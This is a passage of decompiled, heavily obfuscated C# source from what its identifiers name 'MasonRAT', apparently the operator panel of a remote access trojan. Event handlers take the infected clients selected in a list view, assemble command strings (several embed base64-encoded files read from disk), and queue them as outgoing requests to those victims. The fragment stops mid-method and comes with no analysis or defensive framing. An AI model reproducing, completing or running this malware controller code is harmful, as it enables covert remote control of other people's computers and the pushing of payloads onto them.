    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1662) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1663));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cۛـــح\u0608\u060D\u060Eۧـحـ\u060Aْ(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cـۙــ\u060Dـ\u060Dـڅڞٺحْـڞ\u060C\u060A\u0609ـ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    string[] strArray = new string[(633212244 + (866114377 << 1041499923) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 ^ -1007716987 - 1662670384 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 >> (-975839310 ^ -2105846658) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 << 1)];
    strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1664);
    strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
    strArray[(-1806190298 - (1252049976 | 1240916309) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) - (1758453623 + (1005723270 << 430787107) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1665);
    strArray[1631315035 - 1368664643 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 - (226173178 + 932741664 % 1340924603 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) % ((2100461808 | 1656863709) - 1250415352 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
    strArray[(152006454 - 152006433 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 ^ (1540734966 ^ (163954342 | 1385545665)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 ^ 0)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1666);
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cـ\u0608\u0609ۙ\u0608\u0608\u0608\u060C\u060Aـۨب\u0608ڞدد(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    string[] strArray = new string[(((1565097263 > 1959004800 ? 1366465078 : 1024848809) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) > 1961115819 - 764851700 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 ? -871350089 - ~871350094 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 : 1470615271 - 1470615266 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1)];
    strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1667);
    strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
    strArray[(-1242627601 - 454217015 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 ^ -(2035264188 - 338419574 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << -0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1668);
    strArray[((305398001 > 1926684565 ? -831787284 : -623840463) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) - ~((2139457876 > 244895695 ? 623840465 : 831787286) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
    strArray[(261919890 > 1693253283 ? 2 : 2) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 + ((770613258 ^ 1054176879 >> 661186998) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 >> (-1316731286 - -2073191154 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1669);
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u060B\u060D\u060Bּۧ\u060Aڦﯧ\u060Aڠڣح؁ټـڝ\u060Fـ\u0609ء(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      string[] strArray = new string[(-1247493386 ^ ~484639390) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 + ~((2041702897 ^ 789173856 % 870754458) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0)];
      strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1670);
      strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[(1259708655 - (2073086339 << 594637255) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ^ -((2094763943 ^ 1697369390 >> 1464464230) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0] = Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1671)));
      strArray[-877309589 - 2108911389 % 785442366 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 + ((1415336243 ^ 10) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[(1241946116 - 1241946101 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 ^ 179321336 % 2058601263 - 179321325 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1672);
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cـ\u0609\u060Aڠگټڕ\u0608ـٻـﻻ\u060Aۡ\u060Fۙ\u060B(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      string[] strArray = new string[((1547615803 > 1930026499 ? 17 : 13) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 1893298998 - 1893298990 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1)];
      strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1673);
      strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[(-915388128 - 1986932356 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 > (2056248227 ^ 6) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 ? 117046911 % 1234976404 - 117046909 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 : 437928019 - 437928017 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 ^ 0] = Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1674)));
      strArray[((1954496877 ^ ~1840221841) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + (-640620917 - -1431352962 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 << (2012785091 - (1712479656 >> 599655818) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1)] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[((882190210 ^ 15) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) - (2081003923 - 1198813706 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1675);
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cټﻼـ؁ء̍ـ\u0608م\u060Fـڙا\u060A\u0020ٻ(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cـ\u060C\u060A\u060F\u060Dطڠٺڙ\u060Fۭٸ\u0608\u060Dژټټـ\u060C(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1676) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1677))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cۡۜﻋ\u060Cڛٽﯧڕڜۡ\u0608\u0609ى\u060B(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
